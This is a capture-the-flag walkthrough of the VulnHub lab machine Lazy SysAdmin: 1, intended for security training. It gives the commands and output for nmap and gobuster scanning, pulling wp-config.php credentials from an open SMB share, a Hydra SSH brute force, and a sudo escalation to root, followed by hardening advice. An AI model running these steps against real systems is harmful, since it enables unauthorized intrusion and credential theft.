# Lazy SysAdmin: 1 (VulnHub)

## Overview

**Lazy SysAdmin: 1** is an Easy-level VulnHub machine created by **Togie Mcdogie**. The machine focuses on service enumeration, SMB share enumeration, WordPress configuration disclosure, credential harvesting, SSH access, and Linux privilege escalation through insecure sudo permissions.

The challenge demonstrates how exposed network services, publicly accessible SMB shares, weak credentials, and excessive sudo privileges can be chained together to achieve complete system compromise.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Lazy SysAdmin: 1 |
| Author | Togie Mcdogie |
| Platform | VulnHub |
| Release Date | 15 August 2017 |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Obtain Root Access and Retrieve the Proof Flag |

---

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- Robots.txt Analysis
- Directory Brute Forcing
- Gobuster
- SMB Enumeration
- Samba Enumeration
- Credential Harvesting
- WordPress Enumeration
- Configuration File Analysis
- SSH Password Attacks
- Hydra
- Linux Enumeration
- Shell Stabilization
- Sudo Enumeration
- Linux Privilege Escalation
- Post Exploitation

---

## Tools Used

- arp-scan
- Nmap
- Gobuster
- smbclient
- Hydra
- SSH
- Python
- Linux Shell Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open ports and services.
3. Perform web enumeration.
4. Discover hidden directories.
5. Enumerate SMB shares.
6. Retrieve the WordPress configuration file.
7. Harvest exposed credentials.
8. Brute-force SSH authentication.
9. Obtain SSH access.
10. Enumerate sudo privileges.
11. Escalate to root.
12. Retrieve the proof flag.

---

## Network Discovery

Identify the target machine.

```bash
sudo arp-scan -l
```

Result:

```text
192.168.1.108
```

The vulnerable host was successfully identified.

---

## Open Services Identified

Perform service enumeration.

```bash
sudo nmap -A -sV -sC 192.168.1.108 -Pn --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|------|----------|---------|
| 22 | SSH | OpenSSH 6.6.1p1 |
| 80 | HTTP | Apache 2.4.7 |
| 139 | NetBIOS | Samba |
| 445 | SMB | Samba |
| 3306 | MySQL | MySQL |
| 6667 | IRC | InspIRCd |

### Interesting Findings

- SMB shares available.
- WordPress website detected.
- phpMyAdmin exposed.
- robots.txt revealed hidden directories.

---

## Web Enumeration

Perform directory enumeration.

```bash
gobuster dir -u http://192.168.1.108/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Interesting Directories

```text
/wordpress
/phpmyadmin
/old
/test
/wp
```

The target hosts a WordPress installation together with phpMyAdmin.

---

## SMB Enumeration

List available SMB shares.

```bash
smbclient -L 192.168.1.108
```

Discovered share:

```text
share$
```

Connect to the share.

```bash
smbclient //192.168.1.108/share$
```

Browse the WordPress directory.

```bash
cd wordpress
ls
```

Interesting file discovered:

```text
wp-config.php
```

Download it.

```bash
get wp-config.php
```

---

## Credential Harvesting

Inspect the configuration file.

```bash
cat wp-config.php
```

Recovered credentials:

```text
DB_USER: Admin
DB_PASSWORD: TogieMYSQL12345^^
```

The WordPress configuration exposed sensitive database credentials.

---

## SSH Credential Discovery

Perform a password attack.

```bash
hydra -l togie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.108
```

Recovered credentials:

```text
Username: togie
Password: 12345
```

---

## Initial Access

Login via SSH.

```bash
ssh togie@192.168.1.108
```

Verify.

```bash
whoami
```

Output:

```text
togie
```

Initial foothold successfully obtained.

---

## Shell Stabilization

Spawn a proper TTY.

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

This provides a more stable interactive shell for post-exploitation activities.

---

## Privilege Escalation

Enumerate sudo permissions.

```bash
sudo -l
```

Output:

```text
(ALL : ALL) ALL
```

The user can execute any command as root.

Escalate privileges.

```bash
sudo su
```

Verify.

```bash
whoami
```

Output:

```text
root
```

Root access successfully obtained.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
ls
```

Interesting file:

```text
proof.txt
```

Read the proof.

```bash
cat proof.txt
```

The machine is fully compromised.

---

## Vulnerabilities Identified

### 1. Exposed SMB Share

A publicly accessible SMB share exposed sensitive application files.

### 2. WordPress Configuration Disclosure

The `wp-config.php` file contained sensitive database credentials.

### 3. Weak Credentials

The SSH account used a weak password that was vulnerable to dictionary attacks.

### 4. Excessive Sudo Permissions

The user was granted unrestricted sudo access.

```text
(ALL : ALL) ALL
```

### 5. Poor Security Hardening

Multiple exposed services increased the overall attack surface.

---

## Attack Chain Summary

- Host Discovery using arp-scan
- Service Enumeration using Nmap
- Gobuster Directory Enumeration
- SMB Share Enumeration
- WordPress Configuration Retrieval
- Credential Harvesting
- SSH Password Attack using Hydra
- SSH Access as togie
- Shell Stabilization
- Sudo Enumeration
- Root Privilege Escalation
- Proof Flag Retrieval

---

## Security Recommendations

- Disable anonymous or unnecessary SMB shares.
- Restrict access to sensitive WordPress configuration files.
- Protect application secrets using proper permissions.
- Enforce strong password policies.
- Implement account lockout or Fail2Ban to prevent brute-force attacks.
- Remove unnecessary services from public exposure.
- Follow the principle of least privilege.
- Restrict sudo permissions to required commands only.
- Regularly audit shared resources.
- Perform routine vulnerability assessments.

---

## Key Learning Outcomes

- SMB enumeration frequently exposes sensitive information.
- WordPress configuration files often contain valuable credentials.
- Directory brute forcing complements service enumeration.
- Hydra is an effective tool for SSH password auditing.
- Shell stabilization improves post-exploitation workflows.
- Proper sudo enumeration is essential during privilege escalation.
- Weak credentials remain a common attack vector.
- Misconfigured privilege assignments can directly lead to complete system compromise.

---

## Conclusion

**Lazy SysAdmin: 1** is an excellent beginner-friendly VulnHub machine that demonstrates a realistic attack chain involving SMB enumeration, WordPress credential harvesting, SSH password attacks, Linux post-exploitation, and privilege escalation through unrestricted sudo permissions. The machine reinforces the importance of securing shared resources, protecting configuration files, enforcing strong authentication, and applying the principle of least privilege.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
